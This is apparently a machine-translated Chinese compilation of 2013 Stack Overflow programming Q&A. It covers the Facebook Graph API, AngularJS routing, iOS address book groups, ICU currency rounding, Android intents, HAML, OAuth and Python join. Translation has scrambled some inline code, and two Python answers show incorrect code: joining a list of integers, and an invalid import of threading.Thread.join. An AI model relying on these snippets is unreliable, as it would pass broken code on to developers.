include_once dirname(__FILE__) . '/../../includes/include.php'; 
```

# facebook-graph-api - 从 API 识别全球 Facebook 页面

> ID：14220735
> 
> 赞同：6
> 
> 时间：2013-01-08T17:29:21.103
> 
> 标签：facebook-graph-api

Facebook 最近为品牌推出了全球页面：

[http://www.facebook-studio.com/news/item/announcing-a-new-pages-structure-for-global-brands](http://www.facebook-studio.com/news/item/announcing-a-new-pages-structure-for-global-brands)

这些页面具有区域别名。例如，[http://www.facebook.com/asos.france](http://www.facebook.com/asos.france)指向 ASOS 全球页面，但只显示法语内容。

我的问题是：是否可以通过 Facebook 的 API 来识别给定的页面 URL 是否是

1.  全局页面的区域版本，或
2.  标准页面

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-08T20:12:17.283

使用 Graph API 进行查询可以帮助您：

```
/PAGE_NAME_OR_ID?fields=global_brand_children.username,global_brand_parent_page 
```

`PAGE_NAME_OR_ID`在上述查询中替换为三个示例：

*   `asos.france`返回一个`global_brand_parent_page`填充的 JSON 对象。它是一个地区别名。给出了顶级全局页面。
*   `asos`返回一个 JSON 对象，其数组为`global_brand_children`. 它是顶级的全局页面。孩子们显示所有区域别名。
*   `cocacola`只返回一个 id。这是一个独立的页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-04T00:48:32.597

正如 Facebook Graph API 文档所述

> 您需要成为子页面的根页面管理员才能读取页面的 global_brand_children 边缘。

但是，如果您没有该级别的访问权限，我认为还有另一种方法可以回答这个问题。如果您使用此查询：

```
GET /v2.5/{id}?fields=global_brand_root_id,parent_page 
```

如果这些字段中的任何一个存在/非空，那么您可以安全地推断出相关页面具有父级，即**Global Page Root**或**Locations Parent**。

现在，了解全局页面和位置（又名父子）之间的区别值得进一步研究，但据我所知——到目前为止——它们是相互排斥的。页面是全局页面或位置的一部分，但不是两者。

根据我的阅读，全球页面是为需要国家/地区/语言特定页面**的大品牌保留的**，例如可口可乐（如上所述），而位置将用于更多本地属性，例如酒店、零售店等。如果您需要更详细地了解区别， Clickz 对此有一篇非常好的[博客文章](https://www.clickz.com/clickz/column/2364845/how-to-manage-facebook-pages-as-a-multi-unit-brand)。

# javascript - Angularjs - NgView 不工作

> ID：14220737
> 
> 赞同：3
> 
> 时间：2013-01-08T17:29:30.840
> 
> 标签：javascript, angularjs, javascript-framework

**这是基本设置，它有一个默认的 noemployee.html 部分：作为 ng-view**

## ![在此处输入图像描述](../Images/863cb01c999d2222912cc03c6100068e.png)

**Index.html 内容：**

```
 <div id="container" ng-controller="EmployeeCtrl">

 <!-- Side Menu -->
 <span id="smenuSpan">
 <ul id="thumbList">
 <li ng-repeat="employee in employees | filter:categories">
 <a href="Employee/{{employee.id}}"><img  class="smallImage" ng-src="content/app/images/{{employee.image}}" alt="{{employee.description}}"></a>
 </li>
 </ul>
 </span>

 <!-- Content -->
 <span id="contentSpan">
 <div ng-view></div>    
 </span>

 </div> 
```

**我的路线提供者：**

```
var EmployeeModule = angular.module('EmployeeModule',  [], function($routeProvider, $locationProvider) {

$routeProvider.when('/', { templateUrl: 'content/app/partials/noemployee.html', controller: EmployeeModule.EmployeeCtrl });
$routeProvider.when('Employee/:id', { templateUrl: 'content/app/partials/employee.html', controller: EmployeeModule.EmployeeCtrl });
$routeProvider.otherwise({ redirectTo: '/' });

$locationProvider.html5Mode(true); 
```

**我的控制器：**

函数 EmployeeCtrl($scope, $http, $routeParams, $timeout) {

```
 $scope.employees = [
{ "id": 1, "category": "ones", "image": "person1.jpg",  "description": "person 1 description", name:"Jane Smith" },
{ "id": 2, "category": "twos", "image": "person2.jpg", "description": "person 2 description", name: "Mark Sharp" },
{ "id": 3, "category": "threes", "image": "person3.jpg", "description": "person 3 description", name: "Kenny Suave" },
{ "id": 4, "category": "fours", "image": "person4.jpg", "description": "person 4 description", name: "Betty Charmer" },
{ "id": 5, "category": "fives", "image": "person5.jpg", "description": "person 5 description", name: "John Boss" }
];

$scope.employeesCategories = [];
$scope.currentEmployee = {};
$scope.params = $routeParams;

$scope.handleEmployeesLoaded = function (data, status) {
    //$scope.images = data;
    // Set the current image to the first image in images
    $scope.currentEmployee = _.first($scope.employees);
    // Create a unique array based on the category property in the images objects
    $scope.employeeCategories = _.uniq(_.pluck($scope.employees, 'category'));
}

$scope.fetch = function () {
    $http.get($scope.url).success($scope.handleEmployeesLoaded);
};

$scope.setCurrentEmployee = function (employee) {
    $scope.currentEmployee = employee;
};

// Defer fetch for 1 second to give everything an opportunity layout
$timeout($scope.fetch, 1000); 
```

}

**观察：**

1.  目前，如果我点击任何员工，没有“员工/？？” 被添加到地址栏路径[这对我来说不是犯罪]，但是，主要内容 div 不会将部分更改为 employee.html。

2.  如果我注释掉“$locationProvider.html5Mode(true);”，默认的 localhost 现在是“ [http://localhost:31219/#/](http://localhost:31219/#/) ”，当我点击任何员工时，地址栏会显示“ [http://localhost: 31219/Employee/1](http://localhost:31219/Employee/1) '，页面被导航到 404 错误页面。

我知道我在这里混了一些东西，解决方案是如此简单，以至于我无法理解。

**目标：**

1.  我真的很想在地址栏中避免使用哈希标签。
2.  员工/身份证不会出现在地址栏中会很好，但没有要求，但我怀疑部分无法更改。而且，自然

3.  当单击员工时，我希望部分更改为“employee.html”页面。

有谁看到我的代码哪里出错了？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-28T20:16:07.377

> 解决方案：
> 
> 1.  我需要把'#/'放在img href --> href="#/Employee/{{employee.id}}"
> 2.  注释掉'$locationProvider.html5Mode(true);'
> 
> 作为旁注，我当然希望我知道如何在没有那些讨厌的哈希标签的情况下让它工作。有什么想法吗？

为了使用 html5mode，您的服务器必须为其他无效路由提供主应用程序索引文件。

因此，例如，如果您的服务器端代码处理以下路径上的 CRUD 操作：/api/employees、/api/employees/:id 等...

它提供静态内容、图像、html、css、js 等。

对于任何其他请求，否则它应该是 404，而不是响应 404，而是响应 200 代码，并提供 index.html 文件。

这样，任何非静态和非服务器端路由都由 Angular 应用程序处理。

本页的 Angular 指南中提到了这一点：http: [//docs.angularjs.org/guide/dev_guide.services.$location](http://docs.angularjs.org/guide/dev_guide.services.%24location)

请注意末尾的“服务器端”注释：

> **Html链接重写**
> 
> 当您使用 HTML5 历史 API 模式时，您会在不同的浏览器中需要不同的链接，但您所要做的就是指定常规的 URL 链接，例如：`<a href="/some?foo=bar">link</a>`
> 
> 当用户点击此链接时：
> 
> 在旧版浏览器中，URL 更改为 /index.html#!/some?foo=bar
> 
> 在现代浏览器中，URL 更改为 /some?foo=bar 在以下情况下，不会重写链接；相反，浏览器将对原始链接执行完整的页面重新加载。
> 
> 包含目标元素的链接示例：`<a href="/ext/link?a=b" target="_self">link</a>`
> 
> 指向不同域的绝对链接示例：`<a href="http://angularjs.org/">link</a>`
> 
> 以“/”开头的链接在定义 base 时指向不同的基本路径
> 示例：`<a href="/not-my-base/link">link</a>`
> 
> **服务器端**
> 
> *使用这种模式需要在服务器端重写 URL，基本上你必须重写所有指向应用程序入口点的链接（例如 index.html）*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T18:48:27.707

**这就是问题所在：**

```
<a href="Employee/{{employee.id}}"><img  class="smallImage" ng-src="content/app/images/{{employee.image}}" alt="{{employee.description}}"></a> 
```

**解决方案：**

1.  我需要把'#/'放在img href --> href="#/Employee/{{employee.id}}"
2.  注释掉'$locationProvider.html5Mode(true);'

**作为旁注，我当然希望我知道如何在没有那些讨厌的哈希标签的情况下让它工作。有什么想法吗？**

# objective-c - 访问某个组的所有地址

> ID：14220739
> 
> 赞同：0
> 
> 时间：2013-01-08T17:29:42.153
> 
> 标签：objective-c, ios6, addressbook, abaddressbook

我知道如何从通讯录中获取所有人，`ABAddressBookCopyArrayOfAllPeople()`但如何获取不同组的列表，更具体地说，如何从某个组获取联系人。

我尝试了运气，`kABGroupNameProperty`但没有返回组名 - 而是经常（null）和有时是名字。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T23:43:09.510

我认为这就是你想要的：

```
CFArrayRef groups = ABAddressBookCopyArrayOfAllGroups(addressBook);
int count = ABAddressBookGetGroupCount(addressBook);
for (int i = 0; i < count; i++) {
    ABRecordRef group = CFArrayGetValueAtIndex(groups, i);
    NSString *name = (__bridge NSString *)(ABRecordCopyValue(group, kABGroupNameProperty));
    if ([name isEqualToString:@"name of group you're looking for"]) {
        CFArrayRef people = ABGroupCopyArrayOfAllMembers(group);
        // do something with people in group
    }
} 
```

# html - 将 FB 登录操作分配给自定义按钮

> ID：14220742
> 
> 赞同：0
> 
> 时间：2013-01-08T17:29:55.820
> 
> 标签：html, facebook

我的网页上有一个自定义按钮，我想为其分配一个 FB 登录名。

自定义按钮（JS 处理程序）：

```
<div class="button_wrap">
            <a class="button_aLeft" id="button_aLeft"><span></span></a>
            <a class="button_bLeft slidebttn" id="button_bLeft">Login<span></span></a>
        </div> 
```

因为 Facebook 按钮包含很长的代码，所以我将其发布在 jfiddle 上：

[脸书按钮](http://jsfiddle.net/QzdwE/3/)

是否可以将登录操作分配给自定义按钮？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:30:57.287

使用 JS SDK 的登录方法并在您自己的按钮图像等上单击运行它。

[http://developers.facebook.com/docs/reference/javascript/FB.login/](http://developers.facebook.com/docs/reference/javascript/FB.login/)

# schema.org - schema.org 产品标签不完整找不到我缺少的东西

> ID：14220748
> 
> 赞同：0
> 
> 时间：2013-01-08T17:30:35.507
> 
> 标签：schema.org, microformats, rich-snippets

我收到“警告：schema.org 的微数据不完整”。使用 Google 结构化数据测试工具验证我的页面时。

我定义了这些属性：

[http://www.google.com/webmasters/tools/richsnippets?url=http%3A%2F%2Fec2-176-34-78-212.eu-west-1.compute.amazonaws.com%2Fdev-avc% 2Folimp-whey-protein-complex-100.html&html=](http://www.google.com/webmasters/tools/richsnippets?url=http%3A%2F%2Fec2-176-34-78-212.eu-west-1.compute.amazonaws.com%2Fdev-avc%2Folimp-whey-protein-complex-100.html&html=)

有什么我想念的想法吗？我看了看，没有看到我遗漏的任何东西。

我复制/粘贴了一篇旧帖子，只是更改了谷歌结构化数据的链接。

谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T11:44:07.150

您是否尝试过在 schema.org/Product 中放置 PRICE 标签，并在报价中添加更多信息，例如名称、描述。

我还看到可用性是另一个项目范围的一部分，[http://schema.org/ItemAvailability](http://schema.org/ItemAvailability)

# java - 使用 icu 包更改 Java 中 CHF 货币的模式？

> ID：14220750
> 
> 赞同：0
> 
> 时间：2013-01-08T17:30:36.253
> 
> 标签：java, locale, currency, icu

我编写了一个 java 函数来显示每种货币的语言环境模式。请参阅下面的功能。我有兴趣知道的是，为什么当货币是瑞士法郎时，第二个小数点被硬编码为 5？请注意，我使用的是 icu 包，而 java.util.Currency 包不存在此问题。我正在使用 en_US 的默认语言环境。这是与美元和瑞士法郎货币相关的函数的输出：

```
Analyzing currency: [USD] localePattern: [¤#,##0.00;(¤#,##0.00)] Currency symbol [$]
Analyzing currency: [CHF] localePattern: [¤#,##0.05;(¤#,##0.05)] Currency symbol [SwF] 
```

这是我写的java函数：

```
import com.ibm.icu.text.DecimalFormat; 
import com.ibm.icu.text.NumberFormat;
import com.ibm.icu.util.Currency;

public static void main(String[] args)
  {
    Currency configuredCurrency                       = null; 
    NumberFormat formatter                = NumberFormat.getCurrencyInstance();
    DecimalFormat localeCurrencyFormatter = (DecimalFormat)formatter;
    String localePattern                  = "";
    String symbol                         = "";

    String currencies        = "AED,AFN,ALL,AMD,ARS,AUD,BGN,BHD,BND,BOB,BRL,BWP,BYR,CAD,CHF,CLP,CNY,COP,CRC,CZK,DJF,DKK,DOP,DZD,EEK,EGP,ERN,ETB,EUR,GBP,GTQ,HKD,HNL,HRK,HUF,IDR,ILS,INR,IQD,IRR,ISK,JOD,JPY,KES,KPW,KRW,KWD,KZT,LBP,LTL,LVL,LYD,MAD,MKD,MTL,MXN,MYR,NIO,NOK,NZD,OMR,PAB,PEN,PHP,PKR,PLN,PYG,QAR,RON,RUB,SAR,SDD,SEK,SGD,SKK,SOS,SVC,SYP,SwF,THB,TND,TRY,TZS,UAH,USD,UYU,VEB,VND,YER,ZAR,ZWD";
    String[] currenciesArray = currencies.split(",");

    for (int i = 0; i < currenciesArray.length; i++)
    {
      String currency = currenciesArray[i];
      configuredCurrency = Currency.getInstance(currency);
      localeCurrencyFormatter.setCurrency(configuredCurrency);
      localePattern = localeCurrencyFormatter.toPattern();
      symbol = localeCurrencyFormatter.getCurrency().getSymbol();

      System.out.println("Analyzing currency: [" + currency + "] localePattern: [" + localePattern + "] Currency symbol [" + symbol + "]");
    } 
  } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:46:41.247

5 是四舍五入的增量（没有 0.01 瑞士法郎，0.05 是最不值钱的硬币（[瑞士法郎维基百科](http://en.wikipedia.org/wiki/Swiss_franc)））。

同样来自 icu4j DecimalFormat [javadoc](http://www.jarvana.com/jarvana/view/com/ibm/icu/icu4j/4.0.1/icu4j-4.0.1-javadoc.jar!/com/ibm/icu/text/DecimalFormat.html)：

**“代替‘0’，数字‘1’到‘9’可用于表示舍入增量。”**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T08:01:54.533

谢谢大家的帮助。我终于找到了答案。我写了这段代码并成功了：

```
localeCurrencyFormatter.setRoundingIncrement(new BigDecimal("0")); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T17:44:49.857

'5' 告诉 ICU 包，在转换为字符串形式时，有关于如何将数字四舍五入到最接近的 5/100 的特殊规则。

“在瑞士，5 生分是支付交易的最小货币单位。对于瑞士公司代码和货币瑞士法郎，您因此输入 5 。”

[SAP 帮助网站](http://help.sap.com/saphelp_40b/helpdata/en/b1/e364b20437d1118b3f0060b03ca329/frameset.htm)

# visual-studio-2010 - 为什么安装后我的 MSI 会卸载？

> ID：14220752
> 
> 赞同：0
> 
> 时间：2013-01-08T17:30:42.060
> 
> 标签：visual-studio-2010, windows-installer

我使用部署项目模板通过 Visual Studio 2010 创建了一个 MSI。它曾经可以工作，但现在它在安装较早版本时开始起作用 - 即升级。我已设置`RemovePreviousVersions`为 true，但实际发生的是它在安装新版本*后*删除了“以前的”版本，也有效地删除了*新*版本。在[MSI 日志](http://pastebin.com/gY298hBN)文件中，我看到了这方面的证据。（请随意检查）

正常的安装过程不应该是1.卸载以前的版本，2.安装新版本吗？有人对此有任何解释吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T21:26:48.737

我不确定这是否是一场比赛，但你表示它是。当您将项目从 VS2008 移动到 VS2010 时，安装项目功能的 VS2010 版本中存在一个错误。引用[知识库文章](http://support.microsoft.com/kb/2418919)：

> 出现此问题的原因是在 Visual Studio 2010 中创建 GUID 时使用了不同的哈希算法。当您安装从 Visual Studio 2010 安装项目创建的 MSI 文件时，MSI 文件确定 GUID 已更改并删除文件和基于项目顺序的安装路径的注册表项。
> 
> 在这种情况下，安装路径的文件和注册表项会意外消失。

它有一个修补程序，请按照知识库文章链接进行下载和使用说明。

# android - 从 URI 启动 PDF 后按时返回错误的活动

> ID：14220753
> 
> 赞同：0
> 
> 时间：2013-01-08T17:30:47.660
> 
> 标签：android, android-intent

我希望这很简单，但我对发生的事情感到相当困惑。我正在使用从我的应用程序的其他地方复制的一段代码从 Android 活动中的 Imagebutton 启动 PDF。

```
if (v==imagebutton20) {

                File file = new File("/sdcard/documents/20.pdf");
                  if (file.exists()) {
                        Uri path = Uri.fromFile(file);
                        Intent intent = new Intent(Intent.ACTION_VIEW);
                        intent.setDataAndType(path, "application/pdf");
                        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);

                        try {
                            startActivity(intent);
                            overridePendingTransition(R.anim.zoom_enter, R.anim.zoom_exit);
                        } 
                        catch (ActivityNotFoundException e) {

                        }
                  }
            }   //end of   load 
```

pdf 加载正常，但是当我按下启动 pdf 的活动时，它不会显示，而是返回到之前的活动。我试过注释掉

```
 intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP); 
```

但同样的效果。我错过了什么？抱歉，我无法理解官方的 android 指南，一定是度过了充实的一天！

* * *

当我检查了清单文件时，更加困惑的是活动（大脑）的 .xml，但每次我使用上面的代码加载 pdf 时，我都会回到我的应用程序中的错误活动（主要）。我通过图像视图从 Main 调用 Brain 活动，但效果很好。当我从 Brain 启动上面的 PDF 时，后退按钮将我带到 Main 而不是启动活动 Brain。

我在我的应用程序的其他 2 个活动中的其他地方使用了上面的代码，并且后退键的行为与您想要/期望的完全一样。这就是为什么我开始检查 mainfest 文件，但不知道我缺少什么。

任何帮助都会是王牌！

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-21T19:38:23.437

我无法解释为什么以下工作，但如果其他人有类似的问题，我通过以下方式解决了这个问题：

*   在 Eclipse 中创建一个新的 Android 活动。
*   从行为不端的活动中复制代码。
*   将代码粘贴到新创建的活动中。

很简单，不确定为什么会起作用，但确实如此。

# linux-device-driver - 在用户空间中包装内核驱动程序：是真的吗？可能吗？

> ID：14220759
> 
> 赞同：1
> 
> 时间：2013-01-08T17:30:57.750
> 
> 标签：linux-device-driver, interceptor, kernel-module

我编写了一个可加载内核模块（LKM），它将音频驱动程序包装在 /dev/snd/pcmC0D0p 下。

因此，我移至`pcmC0D0p`，`pcmC0D0p_bak`将我的驱动程序重命名为`pcmC0D0p`并通过每个命令`MMAP`，例如`IOCTL`等（但在转发 MMAPed 数据之前做其他事情）。

这很糟糕，我知道（但这是我在 linux 编程中的第一步），但它奏效了。

今天，我读到[一篇](http://free-electrons.com/doc/training/linux-kernel/slides.pdf)关于`Userspace device drivers`.

现在我想知道：这真的可能吗？用用户空间代码编写一个“驱动程序”，实现 MMAP 和 IOCTL 等方法并将其放置在普通内核设备 (/dev/snd/pcmC0D0p) 的位置？

不是，不是吗？

如果可能的话，有人有一个简单的例子，一个参考吗？任何事情都非常受欢迎！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T20:52:14.183

可以编写用户空间设备驱动程序，但并不完全按照您的想法。

一个例子是`uio_pci_generic`模块，它可以使用 PCI 设备的 ID 进行编程（通过 /proc），并且可以通过`mmap`. `read`您可以通过阻止呼叫来接收中断。

请注意，这不允许您伪装成驱动程序，只能执行类似驱动程序的操作（直接与硬件设备通信、接收中断等）。没有一些内核模块的帮助，任何用户空间程序都不能服务于对 ioctl 的调用，或者将自己暴露为字符设备。

# html - 为什么 HAML 交换标签位置？

> ID：14220765
> 
> 赞同：0
> 
> 时间：2013-01-08T17:31:12.833
> 
> 标签：html, ruby-on-rails, ruby, haml

这个 HAML（带有**链式助手**）：

```
- haml_tag :a, helper_method_1(local1, local2).merge( helper_method_2 local3, local4 ) do
  %div{ style: helper_method_3(local5, local6) }
  %span= local7
  %h3{style: "color: black"}= local8 
```

正在生成这个（**倒置**的）HTML：

```
<div style="prop1: val:1; prop2: val2;"></div>
<span>Span Text</span>
<h3 style="prop3: val3;">H3 Text</h3>
<a class="class-value" id="id-value" href="href-value"></a> 
```

但是如果我们删除**链式方法**，比如：

```
(...)
- haml_tag :a, helper_method_1(local1, local2) do
(...) 
```

比 HTML 按预期呈现：

```
<a class="class-value" id="id-value" href="href-value">
  <div style="prop1: val:1; prop2: val2;"></div>
  <span>Span Text</span>
  <h3 style="prop3: val3;">H3 Text</h3>
</a> 
```

*HAML 有什么问题？*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T18:28:30.630

我猜想 HAML 正在生成您期望的 HTML，但浏览器正在重写它以符合 HTML 标准。

让我们看看[HTML4 是怎么说的`<a>`](http://www.w3.org/TR/REC-html40/struct/links.html#edef-A)：

```
<!ELEMENT A - - (%inline;)* -(A)       -- anchor --> 
```

和[*内联*意味着](http://www.w3.org/TR/REC-html40/sgml/dtd.html#inline)：

```
<!ENTITY % inline "#PCDATA | %fontstyle; | %phrase; | %special; | %formctrl;"> 
```

如果您查看*fontstyle*、*phrase*、*special*和*formctrl*，您将不会在这些列表中找到`<div>`or ，因此也不是有效的 HTML4。`<h3>``<a><div></div></a>``<a><h3></h3></a>`

[`<a>`HTML5 对 an可以包含的内容有这样的说法](http://www.w3.org/TR/html-markup/a.html#a-content-model)：

> **允许的内容**
> 
> 透明（短语内容或流式内容）

[*透明内容*](http://www.w3.org/TR/html-markup/terminology.html#transparent)意味着：

> 如果特定元素*foo*的内容模型被描述为 *transparent*，则意味着：
> 
> *   当元素*foo*是允许其内容模型包含流元素的父元素*bar的子元素时，则元素**foo*的内容也可能包含流元素
> *   当元素*foo*是其内容模型将其子元素限制为仅是短语元素的父元素*baz的子元素时，则元素**foo*的任何子元素也被限制为仅是短语元素

A`<div>`是一个[流元素](http://www.w3.org/TR/html-markup/common-models.html#common.elem.flow)而不是一个[词组元素](http://www.w3.org/TR/html-markup/common-models.html#common.elem.phrasing)，`<h3>`也是一个流元素而不是一个词组元素。因此，如果您处于 HTML5 模式，您`<a>`将需要一个可以包含流元素的父元素。我认为这并不适用；`<a>`如果正在使用 HTML5 并且' 的父级不允许流元素，我希望浏览器能够更多地重组事物，它必须将`<div>`and`<h3>`向上移动一个级别以超越对短语元素的限制。

我猜你的浏览器认为它正在呈现 HTML4，或者它不是最新的 HTML5 所说的。

你有一些选择：

1.  查看 HAML 生成的 HTML，不要询问浏览器，在浏览器对其执行任何操作之前查看原始输出。这将告诉你谁在改变事情。
2.  确保您的 HTML 被呈现为 HTML5。
3.  重新构建您的 HTML 以匹配相关标准，您可能必须在此处补偿过时但过于狂热的浏览器。这可能需要`<div>`您`<h3>`在`<a>`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T19:12:14.647

通过更改此行解决了问题：

```
- haml_tag :a, helper_method_1(local1, local2).merge( helper_method_2 local3, local4 ) do 
```

进入这一行（在 helper_method_2 上添加括号）：

```
- haml_tag :a, helper_method_1(local1, local2).merge( helper_method_2(local3, local4) ) do 
```

这是一个不完整的答案。 *请随时扩展/编辑它。*

# java - 替代 dp 用于与背景对齐的文本视图

> ID：14220769
> 
> 赞同：0
> 
> 时间：2013-01-08T17:31:31.463
> 
> 标签：java, android

我的 android 应用程序上有一个文本视图，我想将其放置在屏幕上的特定位置。这是因为屏幕上有一个背景，文本视图必须与我在背景中为其创建的空间一致。

我正在使用边距移动文本并输入例如 20dp 作为上边距 10dp 作为右边距。

我可以使用任何其他方法来确保文本视图将显示在所有设备上的正确位置吗？由于其他设备 mas 具有更高或更低的分辨率。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:41:08.900

使用 relativelayout，您可以更好地控制视图的位置。

`android:layoutalign_parentright=true`标签使视图始终正确。

`android:align_right="@id/someViewId"`使该视图的右边缘与**someViewId**视图的右边缘对齐。

它包含许多标签，使您能够执行此类操作。

# javascript - slideToggle 在手风琴末端产生摆动

> ID：14220776
> 
> 赞同：1
> 
> 时间：2013-01-08T17:31:48.003
> 
> 标签：javascript, jquery

创建手风琴 - 在幻灯片上 - 正在滑动的元素下方的元素似乎会向下移动 px，然后再向上移动，从而产生抖动效果。

```
$(document).ready(function() {

//Promos banners rotation and accordion
$(function(){
    var $accordionList = $('.accordion').find('li');
    var numberOfItems = $accordionList.length;
    var currentItem = 0;

    // Set first item to active
    $accordionList.eq(currentItem).addClass('active').find('.content').slideToggle(800, function() {});

    // Loops through promos
    var infiniateLoop = setInterval(function() {

        if(currentItem == numberOfItems - 1){
            currentItem = 0;
        }
        else {
            currentItem++;
        }

        // Remove active class, if is has it, and close content
        $accordionList.parent().find('li.active').removeClass('active')
            .find('.content').slideToggle(800, function() {
        });

        // Add active class and open content
        $accordionList.eq(currentItem).addClass('active').find('.content').slideToggle(800, function() {
        });

    }, 4000 );

    // Click to show promo
    $accordionList.on('click', function () {
        // Stop rotation
        clearInterval(infiniateLoop);

        var $accordionHead = $(this);

        // Remove active class, if is has it, and close content
        if($accordionHead.hasClass('active')) {
            // Do nothing
        }
        else {
            $accordionHead.parent().find('li.active').removeClass('active')
                .find('.content').slideToggle(800, function() {
            });

            // Add active class and open content
            $accordionHead.addClass('active').find('.content').slideToggle(800, function() {
            });
        };
    });
});

}); 
```

[Fiddle here展示了问题](http://jsfiddle.net/chrism/6tmL3/3/)

我已经看到一些建议您修复内容 div 的高度 - 但该网站是响应式的，因此无法正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T18:31:05.413

是的，我以前遇到过这个问题。我最喜欢的解决方法是自己制作`.slideToggle()`

```
div = $('div');
height = div.height();
width = div.width();

$('div').click( function() {
  if ($(this).hasClass('hidden')) {
    $(this).animate({height: "0", width: "0"}, 200).hide().addClass('hidden');
  } else {
    $(this).animate({height: height, width: width}, 200).show().removeClass('hidden');
  }
}); 
```

如果您愿意，您甚至可以将其包装在原型函数中。

# delphi - Delphi - 将数据从 TQuery 传递到 Quickreport 组件 (QRDBText)

> ID：14220780
> 
> 赞同：2
> 
> 时间：2013-01-08T17:32:08.823
> 
> 标签：delphi, quickreports

这可能是一个新手问题，但我无法解决这个问题。

我有一个 TQuery 组件（Query1），它从数据库中返回一个数据集。

我想将其中的记录传递给 QuickReport QRDBText 组件 - 到目前为止没有成功。

我在运行时创建 Query1，然后一个事件（按下按钮）会出现 Quickreport。我做到了这一点：

```
QReport.DataSet:=Query1;
QRDBText1.DataSet:=Query1;
QRDBText1.Datafield:='Vnev';    //first field in query
QRDBText2.DataSet:=Query1;
QRDBText2.Datafield:='Knev';    //second field in query
QRDBText3.DataSet:=Query1;
QRDBText3.Datafield:='Idcard';  //third field in query 
```

但这向我展示了大灰色什么都没有。如果我使用示例数据库操作并在 QuickReport 上放置一个 TTable，并通过 Object Inspector 设置连接，它就可以工作。但同样：我需要显示我的查询中的数据。任何帮助都会派上用场！谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-05-08T16:37:48.767

`QRdetailband`应该设置为true并填写它`QRdbtext`。

# ruby-on-rails - 对 oAuth 感到困惑，在 Rails 中创建安全 API

> ID：14220788
> 
> 赞同：0
> 
> 时间：2013-01-08T17:32:37.817
> 
> 标签：ruby-on-rails, api, oauth, oauth-2.0

当我希望应用程序能够在没有用户登录的情况下检索应用程序特定信息时以及当我的 API 的另一部分有 OAuth 提供程序时，如何保护我的 API？我可以在没有用户登录的情况下使用客户端应用程序的 OAuth 凭据访问 API 吗？

我在[railscasts 353](http://railscasts.com/episodes/353-oauth-with-doorkeeper)之后使用门卫创建了 OAuth 提供者和客户端。我可以成功地向我的提供商应用程序验证用户身份，并代表用户向我的提供商 API 发出请求。

但是，API 的一部分是用户独立的，这意味着从 API 返回的信息不是特定于用户的，因此用户*不必*登录。例如，假设存储了电子商务网站和商品和价格在多个客户的提供者上。我希望客户端应用程序能够安全地检索与检索应用程序关联的项目/价格，而无需用户登录。因此，如果您访问 example.com，即使用户通过 OAuth 登录，项目也会显示.

当用户通过 OAuth 登录（创建 access_token）时，我只能通过 OAuth 检索此信息。有没有办法在没有用户在场的情况下使用 OAuth（我一直在尝试阅读关于 2-legged OAuth 的内容，如果这是一个合适的解决方案）？还是我需要为应用程序使用 Api 密钥（或 Http Basic Auth）来检索应用程序特定的数据？

如果 OAuth 不是正确的解决方案，因为我没有用户在场，我是否可以/应该使用基于 SSL 的 HTTP 基本身份验证并将客户端站点的 OAuth 密钥用作基本身份验证用户名的 API 密钥？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T00:16:44.443

如果您需要在 API 中对客户端应用程序进行身份验证（无需特别要求用户），请使用[客户端凭据流程](https://www.rfc-editor.org/rfc/rfc6749#section-4.4)

# python - 在 Python 中同时使用字符串和线程中的 join()

> ID：14220791
> 
> 赞同：0
> 
> 时间：2013-01-08T17:32:45.860
> 
> 标签：python, string, multithreading

在我的一个脚本中，我使用了 python 的字符串和线程中的 join() 方法。我尝试使用`import ... as`重命名模块名称，如下所示：

```
import str.join as sjoin
import threading.Thread.join as tjoin 
```

但我总是无法正确导入字符串连接。我检查了官方文档，两个`join()`类路径都应该是正确的。我应该怎么做才能同时使用这两个连接？

**编辑**

最初我没有导入 str.join()。但由于我收到类型错误，我想我应该重命名 join()。但是后来，我意识到我将错误的东西传递给了 str.join()，这就是我得到类型错误的真正原因。我的错！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:33:54.140

[`str.join()`](http://docs.python.org/3/library/stdtypes.html#str.join)是一种方法，用于字符串的实例，例如：

```
>>> ", ".join([1, 2, 3])
1, 2, 3 
```

无需导入任何东西。我在这里使用字符串文字作为示例，但是当然，可以使用任何字符串。这就是将可迭代对象（传递给方法）中的字符串连接在一起的“胶水”。

这也是正确的[`threading.Thread.join()`](http://docs.python.org/3/library/threading.html#threading.Thread.join)- 您应该创建一个`Thread`类的实例并在该实例上使用该`join()`方法。

请注意，由于 Python 的工作方式，您可以直接从类中访问这些方法，然后将实例作为第一个参数传递，但是，这通常是一个非常糟糕的主意，因为它比正常调用它们更难阅读且更费力.

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-08T17:35:42.753

str 是内置的，而不是模块，因此您无法从中导入。但是，您可以这样做：

```
sjoin = str.join
import threading.Thread.join as tjoin 
```

# java - 如何使用 JAX-WS / SOAP 对 Web 服务客户端进行身份验证

> ID：14220792
> 
> 赞同：2
> 
> 时间：2013-01-08T17:32:50.633
> 
> 标签：java, web-services, jakarta-ee, servlets

我是网络服务的新手，并尝试了一些教程。但是当我尝试访问 HTTPS 安全 SOAP Web 服务时，我偶然发现了巡逻。我可以使用`WSDL`我的浏览器和 Netbeans 访问我从提供商那里恢复的登录名/密码。

